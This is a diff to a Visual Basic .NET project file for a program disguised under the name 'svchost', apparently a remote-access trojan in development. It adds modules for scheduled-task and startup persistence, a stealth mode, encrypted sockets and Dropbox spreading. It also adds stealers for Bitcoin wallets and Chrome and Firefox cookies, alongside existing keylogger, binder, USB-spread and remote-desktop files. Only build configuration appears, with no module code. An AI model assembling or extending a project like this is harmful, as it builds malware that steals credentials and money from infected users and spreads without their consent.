@@ -6,11 +6,11 @@
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{A48C732C-7776-4714-846F-55BE60D18D98}</ProjectGuid>
     <OutputType>WinExe</OutputType>
-    <StartupObject>svchost.My.MyApplication</StartupObject>
+    <StartupObject>Sub Main</StartupObject>
     <RootNamespace>svchost</RootNamespace>
     <AssemblyName>svchost</AssemblyName>
     <FileAlignment>512</FileAlignment>
-    <MyType>WindowsForms</MyType>
+    <MyType>WindowsFormsWithCustomSubMain</MyType>
     <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
@@ -81,9 +81,14 @@
     <Compile Include="Form1.vb">
       <SubType>Form</SubType>
     </Compile>
+    <Compile Include="Main.vb" />
     <Compile Include="Other\Binder.vb" />
     <Compile Include="Other\Keylogger.vb" />
-    <Compile Include="Other\Startup.vb" />
+    <Compile Include="Persistence\SchTask.vb" />
+    <Compile Include="Persistence\Startup.vb" />
+    <Compile Include="Persistence\Stealth_Mode.vb" />
+    <Compile Include="Socket\Encryption.vb" />
+    <Compile Include="Spreads\DropboxSpread.vb" />
     <Compile Include="Spreads\USB.vb" />
     <Compile Include="Other\Watchdog.vb" />
     <Compile Include="Socket\HTTP.vb" />
@@ -103,6 +108,9 @@
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
     <Compile Include="Other\RemoteDesktop.vb" />
+    <Compile Include="Stealers\BitcoinWallet.vb" />
+    <Compile Include="Stealers\ChromeCookies.vb" />
+    <Compile Include="Stealers\FirefoxCookies.vb" />
   </ItemGroup>
   <ItemGroup>
     <EmbeddedResource Include="Form1.resx">
